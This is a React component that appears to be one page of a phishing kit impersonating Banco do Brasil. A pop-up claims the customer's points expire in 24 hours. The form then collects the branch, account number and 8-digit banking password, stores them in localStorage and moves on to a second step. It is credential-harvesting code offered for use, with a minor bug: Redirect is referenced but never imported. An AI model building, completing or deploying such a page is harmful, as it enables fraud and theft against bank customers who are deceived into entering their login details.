import React, { useRef, useState } from 'react'
import InputMask from 'react-input-mask';
import { Link } from 'react-router-dom';  // Importa Redirect
import Navbar from '../components/Navbar'
import './PageOne.css'

const PageOne = () => {
  const [redirect, setRedirect] = useState(false);  // Estado para redirecionamento

  const [agencia, setAgencia] = useState(null)
  const [conta, setConta] = useState('')
  const [senha8, setSenha8] = useState(null)

  const setStore = () => {
    localStorage.setItem('agencia', agencia);
    localStorage.setItem('conta', conta);
    localStorage.setItem('senha8', senha8);
    setRedirect(true);
    if (redirect) {
      return <Redirect to="/step2" />;
    }
  }

  const defineAgencia = (e) => {
    setAgencia(e.target.value)
  }
  const defineConta = (e) => {
    let novaString = e.target.value;
    let atualValor = novaString.replace(/-/g, '');

    // Verifica se a string tem mais de 2 caracteres para garantir que há um último dígito para substituir
    if (atualValor.length > 2) {
      // Obtém o último dígito da string
      const ultimoDigito = atualValor[atualValor.length - 1];

      // Substitui o último dígito por 'X' (exemplo)
      let novoValor = atualValor.substring(0, atualValor.length - 1) + '-'; // Substitua 'X' pelo caractere desejado
      novoValor = novoValor + ultimoDigito;
      // Define o estado 'conta' com o novo valor
      setConta(novoValor);
    } else {
      // Caso contrário, apenas define o estado 'conta' com o valor atual
      setConta(atualValor);
    }
  };
  const defineSenha8 = (e) => {
    setSenha8(e.target.value)
  }

  const modalRef = useRef(null)

  const closeModal = () => {
    modalRef.current.style.display = 'none';
  }

  return (
    <div className='page1-frame'>
      <div className='modal' ref={modalRef}>
        <div className='sob-modal'>
          <i className="bi bi-exclamation-circle" id='exclamation-icon'></i>
          <span className='title-alert'>BB INFORMA</span>
          <span className='subtitle-alert'>Prezado (a) cliente, seus pontos vence em 24h. Troque por produtos, milhas ou descontos fatura.</span>
          <span className='resgatar-btn' onClick={() => closeModal()}>RESGATAR PRODUTOS</span>
        </div>
      </div>
      <Link to='/step2'>
      <div className='next-btn-page2' onClick={() => setStore()}>
        <span>CONTINUAR</span>
      </div>
      </Link>
      <Navbar />
      <div className='navegacao-frame'>
        <i className="bi bi-arrow-left" id='arrow-left'></i>
        <span className='title-of-pages'>Acessar conta</span>
      </div>
      <div className='solicitacao-1'>
        <span className='titulo-solicitacao'>Pessoa física</span>
        <span className='subtitulo-solicitacao'>Informe os dados para acessar sua conta:</span>
      </div>
      <div className='entradas-1'>
        <span id='titulo-especifico-edit'>Agência</span>
        <InputMask className='input' mask="9999-9" value={agencia} onChange={defineAgencia} />
        <span className='subtitulo-solicitacao'>Troque X por 0, se necessário</span>
        <span className='titulo-entrada' id='titulo-especifico-edit'>Conta</span>
        <input
        type="text"
        value={conta}
        onChange={defineConta}
        className='input'
        />
        <span className='subtitulo-solicitacao'>Troque X por 0, se necessário</span>
        <span className='titulo-entrada' id='titulo-especifico-edit'>Senha de 8 dígitos</span>
        <InputMask className='input' mask="********" value={senha8} type='password' onChange={defineSenha8} />
      </div>
    </div>
  )
}

export default PageOne